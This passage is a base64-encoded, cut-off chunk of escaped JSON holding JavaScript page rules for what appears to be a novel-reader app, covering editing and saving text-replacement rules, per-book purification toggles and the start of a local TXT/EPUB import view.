dWxlLmlzUmVnZXhcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIiArIHJlcGxhY2VSdWxlLmlzUmVnZXgpO1xcXFxuICAgIHB1dE15VmFyKFxcXFxcXFwiLmVkaXRSZXBsYWNlUnVsZS5maXJzdFxcXFxcXFwiLFxcXFxcXFwiMVxcXFxcXFwiKTtcXFxcbn1cXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLmi7fotJ1cXFxcXFxcIixcXFxcbiAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgoKSA9PiB7XFxcXG4gICAgICAgIGxldCBhdHQgPSBbXFxcXFxcXCJuYW1lXFxcXFxcXCIsIFxcXFxcXFwiaXNSZWdleFxcXFxcXFwiLCBcXFxcXFxcInBhdHRlcm5cXFxcXFxcIiwgXFxcXFxcXCJyZXBsYWNlbWVudFxcXFxcXFwiXTtcXFxcbiAgICAgICAgbGV0IGpzb24gPSB7fTtcXFxcbiAgICAgICAgYXR0LmZvckVhY2goa2V5ID0+IHtcXFxcbiAgICAgICAgICAgIGxldCB2YWx1ZSA9IGdldE15VmFyKFxcXFxcXFwiLmVkaXRSZXBsYWNlUnVsZS5cXFxcXFxcIiArIGtleSwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBpZiAoa2V5ID09PSBcXFxcXFxcImlzUmVnZXhcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgICAgIHZhbHVlID0gdmFsdWUgPT09IFxcXFxcXFwidHJ1ZVxcXFxcXFwiID8gdHJ1ZSA6IGZhbHNlO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAganNvbltrZXldID0gdmFsdWU7XFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICBjb3B5KEpTT04uc3RyaW5naWZ5KGpzb24pKTtcXFxcbiAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgIH0pLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMlxcXFxcXFwiXFxcXG59KTtcXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLnspjotLRcXFxcXFxcIixcXFxcbiAgICB1cmw6ICQoXFxcXFxcXCJ7e2NsaXBib2FyZH19XFxcXFxcXCIpLmlucHV0KCgpID0+IHtcXFxcbiAgICAgICAgdHJ5IHtcXFxcbiAgICAgICAgICAgIGxldCBqc29uID0gSlNPTi5wYXJzZShpbnB1dCk7XFxcXG4gICAgICAgICAgICBpZiAoQXJyYXkuaXNBcnJheShqc29uKSB8fCBqc29uLnBhdHRlcm4gPT0gdW5kZWZpbmVkKSByZXR1cm47XFxcXG4gICAgICAgICAgICBsZXQgYXR0ID0gW1xcXFxcXFwibmFtZVxcXFxcXFwiLCBcXFxcXFxcImlzUmVnZXhcXFxcXFxcIiwgXFxcXFxcXCJwYXR0ZXJuXFxcXFxcXCIsIFxcXFxcXFwicmVwbGFjZW1lbnRcXFxcXFxcIl07XFxcXG4gICAgICAgICAgICBhdHQuZm9yRWFjaChrZXkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiLmVkaXRSZXBsYWNlUnVsZS5cXFxcXFxcIiArIGtleSwgU3RyaW5nKGpzb25ba2V5XSkpO1xcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgICAgIGxvZyhlLnRvU3RyaW5nKCkpO1xcXFxuICAgICAgICB9XFxcXG4gICAgfSksXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8yXFxcXFxcXCJcXFxcbn0pO1xcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcImlucHV0XFxcXFxcXCIsXFxcXG4gICAgZGVzYzogXFxcXFxcXCLmm7/mjaLop4TliJnlkI3np7BcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICB0aXRsZVZpc2libGU6IGZhbHNlLFxcXFxuICAgICAgICBkZWZhdWx0VmFsdWU6IGdldE15VmFyKFxcXFxcXFwiLmVkaXRSZXBsYWNlUnVsZS5uYW1lXFxcXFxcXCIsIHJlcGxhY2VSdWxlLm5hbWUpLFxcXFxuICAgICAgICBvbkNoYW5nZTogJ3B1dE15VmFyKFxcXFxcXFwiLmVkaXRSZXBsYWNlUnVsZS5uYW1lXFxcXFxcXCIsaW5wdXQpOydcXFxcbiAgICB9XFxcXG59KTtcXFxcblxcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcImlucHV0XFxcXFxcXCIsXFxcXG4gICAgZGVzYzogXFxcXFxcXCLmm7/mjaLop4TliJlcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICB0aXRsZVZpc2libGU6IGZhbHNlLFxcXFxuICAgICAgICB0eXBlOiBcXFxcXFxcInRleHRhcmVhXFxcXFxcXCIsXFxcXG4gICAgICAgIGhlaWdodDogLTEsXFxcXG4gICAgICAgIGRlZmF1bHRWYWx1ZTogZ2V0TXlWYXIoXFxcXFxcXCIuZWRpdFJlcGxhY2VSdWxlLnBhdHRlcm5cXFxcXFxcIiwgcmVwbGFjZVJ1bGUucGF0dGVybiksXFxcXG4gICAgICAgIG9uQ2hhbmdlOiAncHV0TXlWYXIoXFxcXFxcXCIuZWRpdFJlcGxhY2VSdWxlLnBhdHRlcm5cXFxcXFxcIiwgaW5wdXQpOydcXFxcbiAgICB9XFxcXG59KTtcXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLmmK/lkKbkvb/nlKjmraPliJnooajovr7lvI/vvJpcXFxcXFxcIiArIGdldE15VmFyKFxcXFxcXFwiLmVkaXRSZXBsYWNlUnVsZS5pc1JlZ2V4XFxcXFxcXCIpLFxcXFxuICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKChpZCkgPT4ge1xcXFxuICAgICAgICBsZXQgaXNSZWdleCA9IGdldE15VmFyKFxcXFxcXFwiLmVkaXRSZXBsYWNlUnVsZS5pc1JlZ2V4XFxcXFxcXCIpID09PSBcXFxcXFxcInRydWVcXFxcXFxcIiA/IGZhbHNlIDogdHJ1ZTtcXFxcbiAgICAgICAgdXBkYXRlSXRlbSh7XFxcXG4gICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgIGlkOiBpZFxcXFxuICAgICAgICAgICAgfSxcXFxcbiAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuaYr+WQpuS9v+eUqOato+WImeihqOi+vuW8j++8mlxcXFxcXFwiICsgaXNSZWdleFxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCIuZWRpdFJlcGxhY2VSdWxlLmlzUmVnZXhcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIiArIGlzUmVnZXgpO1xcXFxuICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG4gICAgfSwgaWQpLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMVxcXFxcXFwiLFxcXFxuICAgIGV4dHJhOiB7XFxcXG4gICAgICAgIGlkOiBpZFxcXFxuICAgIH1cXFxcbn0pO1xcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcImlucHV0XFxcXFxcXCIsXFxcXG4gICAgZGVzYzogXFxcXFxcXCLmm7/mjaLkuLpcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICB0aXRsZVZpc2libGU6IGZhbHNlLFxcXFxuICAgICAgICB0eXBlOiBcXFxcXFxcInRleHRhcmVhXFxcXFxcXCIsXFxcXG4gICAgICAgIGhlaWdodDogLTEsXFxcXG4gICAgICAgIGRlZmF1bHRWYWx1ZTogZ2V0TXlWYXIoXFxcXFxcXCIuZWRpdFJlcGxhY2VSdWxlLnJlcGxhY2VtZW50XFxcXFxcXCIsIHJlcGxhY2VSdWxlLnJlcGxhY2VtZW50KSxcXFxcbiAgICAgICAgb25DaGFuZ2U6ICdwdXRNeVZhcihcXFxcXFxcIi5lZGl0UmVwbGFjZVJ1bGUucmVwbGFjZW1lbnRcXFxcXFxcIixpbnB1dCk7J1xcXFxuICAgIH1cXFxcbn0pO1xcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIuS/neWtmFxcXFxcXFwiLFxcXFxuICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKChyZXBsYWNlUnVsZSwgaXNOZXcsIGluZGV4KSA9PiB7XFxcXG4gICAgICAgIGxldCBwYXR0ZXJuID0gZ2V0TXlWYXIoXFxcXFxcXCIuZWRpdFJlcGxhY2VSdWxlLnBhdHRlcm5cXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgIGlmICghcGF0dGVybikge1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/mm7/mjaLop4TliJnkuI3og73kuLrnqbpcXFxcXFxcIjtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBPYmplY3QuYXNzaWduKHJlcGxhY2VSdWxlLCB7XFxcXG4gICAgICAgICAgICBuYW1lOiBnZXRNeVZhcihcXFxcXFxcIi5lZGl0UmVwbGFjZVJ1bGUubmFtZVxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKSxcXFxcbiAgICAgICAgICAgIGlzUmVnZXg6IGdldE15VmFyKFxcXFxcXFwiLmVkaXRSZXBsYWNlUnVsZS5pc1JlZ2V4XFxcXFxcXCIpID09PSBcXFxcXFxcInRydWVcXFxcXFxcIiA/IHRydWUgOiBmYWxzZSxcXFxcbiAgICAgICAgICAgIHBhdHRlcm46IHBhdHRlcm4sXFxcXG4gICAgICAgICAgICByZXBsYWNlbWVudDogZ2V0TXlWYXIoXFxcXFxcXCIuZWRpdFJlcGxhY2VSdWxlLnJlcGxhY2VtZW50XFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpXFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICBsZXQgcnVsZUxpc3QgPSBKU09OLnBhcnNlKHJlYWRGaWxlKFxcXFxcXFwicmVwbGFjZVJ1bGUuanNvblxcXFxcXFwiKSB8fCBcXFxcXFxcIltdXFxcXFxcXCIpO1xcXFxuICAgICAgICBpZiAoaXNOZXcgPT0gXFxcXFxcXCJ0cnVlXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgIHJ1bGVMaXN0LnB1c2gocmVwbGFjZVJ1bGUpO1xcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgcnVsZUxpc3Quc3BsaWNlKGluZGV4LCAxLCByZXBsYWNlUnVsZSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgc2F2ZUZpbGUoXFxcXFxcXCJyZXBsYWNlUnVsZS5qc29uXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KHJ1bGVMaXN0KSk7XFxcXG4gICAgICAgIGJhY2soKTtcXFxcbiAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/kv53lrZjmiJDlip9cXFxcXFxcIjtcXFxcbiAgICB9LCByZXBsYWNlUnVsZSwgaXNOZXcsIGluZGV4KSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0X2NlbnRlcl8xXFxcXFxcXCIsXFxcXG59KTtcXFxcblxcXFxuLypcXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJpbnB1dFxcXFxcXFwiLFxcXFxuICAgIGRlc2M6IFxcXFxcXFwi5pu/5o2i6IyD5Zu0XFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgICAgdGl0bGVWaXNpYmxlOiBmYWxzZSxcXFxcbiAgICAgICAgdHlwZTogXFxcXFxcXCJ0ZXh0YXJlYVxcXFxcXFwiLFxcXFxuICAgICAgICBoZWlnaHQ6IC0xLFxcXFxuICAgICAgICBkZWZhdWx0VmFsdWU6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgICAgIG9uQ2hhbmdlOiAncHV0TXlWYXIoXFxcXFxcXCIuZWRpdFJlcGxhY2VSdWxlLnNjb3BlXFxcXFxcXCIsaW5wdXQpOydcXFxcbiAgICB9XFxcXG59KTtcXFxcblxcXFxuKi9cXFxcbnNldFJlc3VsdChsYXlvdXQpO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIiN2LuWwj+ivtOS4quaAp+WMluWHgOWMllxcXCIsXFxcInBhdGhcXFwiOlxcXCJOb3ZlbEN1c3RvbS52aWV3XFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxuc2V0UGFnZVRpdGxlKFxcXFxcXFwi5pu/5o2i6KeE5YiZfFxcXFxcXFwiICsgTVlfUEFSQU1TLm5hbWUpO1xcXFxubGV0IHJ1bGVMaXN0ID0gSlNPTi5wYXJzZShyZWFkRmlsZShcXFxcXFxcInJlcGxhY2VSdWxlLmpzb25cXFxcXFxcIikgfHwgXFxcXFxcXCJbXVxcXFxcXFwiKTtcXFxcbmxldCBpZCA9IFxcXFxcXFwiI1xcXFxcXFwiICsgbmV3IERhdGUoKS5nZXRUaW1lKCk7XFxcXG5cXFxcbmNvbnN0IGJvb2tJbmZvID0gT2JqZWN0LmFzc2lnbih7XFxcXG4gICAgZm9vdDogMCxcXFxcbiAgICBpc1JlcGxhY2U6IHRydWUsXFxcXG4gICAgc2VsZWN0ZWQ6IFtdXFxcXG59LCBKU09OLnBhcnNlKHJlcXVlc3QoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyBNWV9QQVJBTVMucGF0aCArIFxcXFxcXFwiL2Jvb2tJbmZvLmpzb25cXFxcXFxcIikgfHwgXFxcXFxcXCJ7fVxcXFxcXFwiKSk7XFxcXG5cXFxcbmxldCBsYXlvdXQgPSBbXTtcXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICB0aXRsZTogW1xcXFxcXFwi4piQ5YeA5YyWXFxcXFxcXCIsIFxcXFxcXFwi4piR5YeA5YyWXFxcXFxcXCJdWzAgKyBib29rSW5mby5pc1JlcGxhY2VdLFxcXFxuICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKCgkaWQsIHBhdGgpID0+IHtcXFxcblxcXFxuICAgICAgICB2YXIgYm9va0luZm8gPSBKU09OLnBhcnNlKHJlcXVlc3QoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyBwYXRoICsgXFxcXFxcXCIvYm9va0luZm8uanNvblxcXFxcXFwiKSB8fCBcXFxcXFxcInt9XFxcXFxcXCIpO1xcXFxuICAgICAgICBsZXQgaXNSZXBsYWNlID0gYm9va0luZm8uaXNSZXBsYWNlPT09dW5kZWZpbmVkP3RydWU6Ym9va0luZm8uaXNSZXBsYWNlO1xcXFxuICAgICAgICBib29rSW5mby5pc1JlcGxhY2UgPSAhaXNSZXBsYWNlO1xcXFxuICAgICAgICB3cml0ZUZpbGUoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyBwYXRoICsgXFxcXFxcXCIvYm9va0luZm8uanNvblxcXFxcXFwiLCBKU09OLnN0cmluZ2lmeShib29rSW5mbykpO1xcXFxuICAgICAgICB1cGRhdGVJdGVtKCRpZCwge1xcXFxuICAgICAgICAgICAgdGl0bGU6IGlzUmVwbGFjZSA/IFxcXFxcXFwi4piQ5YeA5YyWXFxcXFxcXCIgOiBcXFxcXFxcIuKYkeWHgOWMllxcXFxcXFwiLFxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgIH0sIGlkICsgXFxcXFxcXCIjLTFcXFxcXFxcIiwgTVlfUEFSQU1TLnBhdGgpLFxcXFxuICAgIGV4dHJhOiB7XFxcXG4gICAgICAgIGlkOiBpZCArIFxcXFxcXFwiIy0xXFxcXFxcXCJcXFxcbiAgICB9LFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMlxcXFxcXFwiXFxcXG59KTtcXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLnvJbovpHop4TliJlcXFxcXFxcIixcXFxcbiAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9wYWdlL1NldHRpbmcvTW9yZS52aWV3I25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5IyNub1JlZnJlc2gjP3NldHRpbmdUeXBlPXJlcGxhY2VSdWxlXFxcXFxcXCIsXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8yXFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6e1xcXFxuICAgICAgICBpc1JlZnJlc2g6IHRydWVcXFxcbiAgICB9XFxcXG59KTtcXFxcbmZvciAobGV0IGkgPSAwLCBsZW4gPSBydWxlTGlzdC5sZW5ndGg7IGkgPCBsZW47IGkrKykge1xcXFxuICAgIGxldCByZXBsYWNlUnVsZSA9IHJ1bGVMaXN0W2ldO1xcXFxuICAgIGxldCBpc1RydWUgPSBib29rSW5mby5zZWxlY3RlZC5pbmNsdWRlcyhyZXBsYWNlUnVsZS5pZCk7XFxcXG4gICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogKGlzVHJ1ZSA/IFxcXFxcXFwi4pePXFxcXFxcXCIgOiBcXFxcXFxcIuKXi1xcXFxcXFwiKSArIHJlcGxhY2VSdWxlLm5hbWUsXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMVxcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiLFxcXFxuICAgICAgICB5OiAwLFxcXFxuICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgaXNUcnVlOiBpc1RydWUsXFxcXG4gICAgICAgICAgICBpZDogaWQgKyBpLFxcXFxuICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxcXG4gICAgICAgIH1cXFxcbiAgICB9KTtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIuW8gOWQr1xcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgoJGlkLCByZXBsYWNlUnVsZSwgcGF0aCkgPT4ge1xcXFxuICAgICAgICAgICAgaWYgKGZpbmRJdGVtKCRpZCkuZXh0cmEuaXNUcnVlKSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/lt7LlvIDlkK9cXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIGNvbnN0IGJvb2tJbmZvID0gT2JqZWN0LmFzc2lnbih7XFxcXG4gICAgICAgICAgICAgICAgc2VsZWN0ZWQ6IFtdXFxcXG4gICAgICAgICAgICB9LCBKU09OLnBhcnNlKHJlcXVlc3QoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyBwYXRoICsgXFxcXFxcXCIvYm9va0luZm8uanNvblxcXFxcXFwiKSB8fCBcXFxcXFxcInt9XFxcXFxcXCIpKTtcXFxcbiAgICAgICAgICAgIGJvb2tJbmZvLnNlbGVjdGVkLnB1c2gocmVwbGFjZVJ1bGUuaWQpO1xcXFxuICAgICAgICAgICAgdXBkYXRlSXRlbSgkaWQsIHtcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLil49cXFxcXFxcIiArIHJlcGxhY2VSdWxlLm5hbWUsXFxcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgaXNUcnVlOiB0cnVlLFxcXFxuICAgICAgICAgICAgICAgICAgICBpZDogJGlkLFxcXFxuICAgICAgICAgICAgICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2VcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgIHdyaXRlRmlsZShcXFxcXFxcImZpbGU6Ly9cXFxcXFxcIiArIHBhdGggKyBcXFxcXFxcIi9ib29rSW5mby5qc29uXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KGJvb2tJbmZvKSk7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG4gICAgICAgIH0sIGlkICsgaSwgcmVwbGFjZVJ1bGUsIE1ZX1BBUkFNUy5wYXRoKSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8yXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIuWFs+mXrVxcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgoJGlkLCByZXBsYWNlUnVsZSwgcGF0aCkgPT4ge1xcXFxuICAgICAgICAgICAgaWYgKCFmaW5kSXRlbSgkaWQpLmV4dHJhLmlzVHJ1ZSkge1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5bey5YWz6ZetXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICBjb25zdCBib29rSW5mbyA9IE9iamVjdC5hc3NpZ24oe1xcXFxuICAgICAgICAgICAgICAgIHNlbGVjdGVkOiBbXVxcXFxuICAgICAgICAgICAgfSwgSlNPTi5wYXJzZShyZXF1ZXN0KFxcXFxcXFwiZmlsZTovL1xcXFxcXFwiICsgcGF0aCArIFxcXFxcXFwiL2Jvb2tJbmZvLmpzb25cXFxcXFxcIikgfHwgXFxcXFxcXCJ7fVxcXFxcXFwiKSk7XFxcXG4gICAgICAgICAgICBib29rSW5mby5zZWxlY3RlZC5zcGxpY2UoYm9va0luZm8uc2VsZWN0ZWQuaW5kZXhPZihyZXBsYWNlUnVsZS5pZCksIDEpO1xcXFxuICAgICAgICAgICAgdXBkYXRlSXRlbSgkaWQsIHtcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLil4tcXFxcXFxcIiArIHJlcGxhY2VSdWxlLm5hbWUsXFxcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgaXNUcnVlOiBmYWxzZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgaWQ6ICRpZCxcXFxcbiAgICAgICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICB3cml0ZUZpbGUoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyBwYXRoICsgXFxcXFxcXCIvYm9va0luZm8uanNvblxcXFxcXFwiLCBKU09OLnN0cmluZ2lmeShib29rSW5mbykpO1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgICAgICB9LCBpZCArIGksIHJlcGxhY2VSdWxlLCBNWV9QQVJBTVMucGF0aCksXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMlxcXFxcXFwiXFxcXG4gICAgfSk7XFxcXG4gICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lX2JsYW5rXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbn1cXFxcblxcXFxuc2V0UmVzdWx0KGxheW91dCk7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwiI3Yu5aSW5a+85bCP6K+0XFxcIixcXFwicGF0aFxcXCI6XFxcImV4dGVybmFsaW1wb3J0VHh0LnZpZXdcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG5mdW5jdGlvbiB0eHRWaWV3KGxheW91dCkge1xcXFxuICAgIGNvbnN0IEZpbGUgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvRmlsZS5qc1xcXFxcXFwiKTtcXFxcbiAgICBjb25zdCBDb25maWcgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvQ29uZmlnLmpzXFxcXFxcXCIpO1xcXFxuICAgIGxldCBmaWxlcyA9IEZpbGUuZ2V0RmlsZVBhdGgoQ29uZmlnLmV4dGVybmFsSW1wb3J0UGF0aCk7XFxcXG4gICAgZmlsZXMgPSBmaWxlcy5maWx0ZXIodiA9PiAvKFxcXFxcXFxcLnR4dHxcXFxcXFxcXC5lcHViKSQvLnRlc3Qodi5uYW1lKSk7XFxcXG5cXFxcbiAgICBzZXRQYWdlVGl0bGUoXFxcXFxcXCLlsI/or7TkuabmnrZcXFxcXFxcIik7XFxcXG4gICAgLy9sZXQgbGF5b3V0ID0gW107XFxcXG4gICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICB1cmw6ICdpbnB1dD9cXFxcXFxcImhpa2VyOi8vcGFnZS90eHRTZWFyY2gudmlldyNub1JlZnJlc2gjP3NlYXJjaFRlcm1zPVxcXFxcXFwiK2VuY29kZVVSSUNvbXBvbmVudChpbnB1dCk6XFxcXFxcXCJ0b2FzdDovL+ivt+i+k+WFpeWwj+ivtOWQjVxcXFxcXFwiJyxcXFxcbiAgICAgICAgZGVzYzogXFxcXFxcXCLmkJzntKJcXFxcXFxcIixcXFxcbiAgICAgICAgdGl0bGU6IFxcXFxcXFwi8J+UjVxcXFxcXFwiLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJpbnB1dFxcXFxcXFwiLFxcXFxuICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgZGVmYXVsdFZhbHVlOiBnZXRNeVZhcihcXFxcXFxcInNlYXJjaEtleUJ5VHh0XFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpLFxcXFxuICAgICAgICAgICAgb25DaGFuZ2U6IFxcXFxcXFwicHV0TXlWYXIoJ3NlYXJjaEtleUJ5VHh0JyxpbnB1dClcXFxcXFxcIlxcXFxuICAgICAgICB9XFxcXG4gICAgfSk7XFxcXG4gICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogXFxcXFxcXCLlr7zlhaXlsI/or7RcXFxcXFxcIixcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8zXFxcXFxcXCIsXFxcXG4gICAgICAgIHVybDogJChbXFxcXFxcXCLns7vnu5/pgInmi6nlmahcXFxcXFxcIiwgXFxcXFxcXCLmtbfpmJTpgInmi6nlmahcXFxcXFxcIl0sIDEsIFxcXFxcXFwi6YCJ5oup5Zmo57G75Z6LXFxcXFxcXCIpLnNlbGVjdCgoKSA9PiB7XFxcXG4gICAgICAgICAgICBpZiAoaW5wdXQgPT09IFxcXFxcXFwi57O757uf6YCJ5oup5ZmoXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJmaWxlU2VsZWN0Oi8vXFxcXFxcXCIgKyAkLnRvU3RyaW5nKCgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgaWYgKCEvKFxcXFxcXFxcLnR4dHwuZXB1YikkL2kudGVzdChpbnB1dCkpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRvYXN0KFxcXFxcXFwi6YCJ5oup5LqG6ZSZ6K+v55qE5paH5Lu257G75Z6LXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuO1xcXFxuICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbnN0IENvbmZpZyA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9Db25maWcuanNcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBmaWxlTWF0Y2ggPSBpbnB1dC5tYXRjaCgvXFxcXFxcXFwvKFteXFxcXFxcXFwvXSo/KShcXFxcXFxcXC50eHR8XFxcXFxcXFwuZXB1YikkL2kpO1xcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgbm92ZWxOYW1lID0gZmlsZU1hdGNoWzFdLnJlcGxhY2UoXFxcXFxcXCJfZmlsZVNlbGVjdF9cXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCB